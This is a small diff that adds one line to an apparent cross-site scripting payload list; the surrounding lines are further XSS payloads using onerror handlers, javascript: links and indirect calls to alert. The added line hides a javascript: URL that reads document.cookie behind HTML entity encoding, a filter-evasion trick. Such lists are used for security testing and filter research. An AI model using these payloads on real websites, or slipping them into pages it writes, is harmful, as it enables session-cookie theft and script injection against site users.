@@ -89,4 +89,5 @@ frames['alert'](document["cookie"])
 ";(a=alert,b=1,a(b))//
 <img src=x onerror=(a=alert,b=1,a(b))>
 <A HREF="javascript:alert(7)">Click here</A>
+<a href="javascript&colon;alert&lpar;document&period;cookie&rpar;">Click Here</a>
 
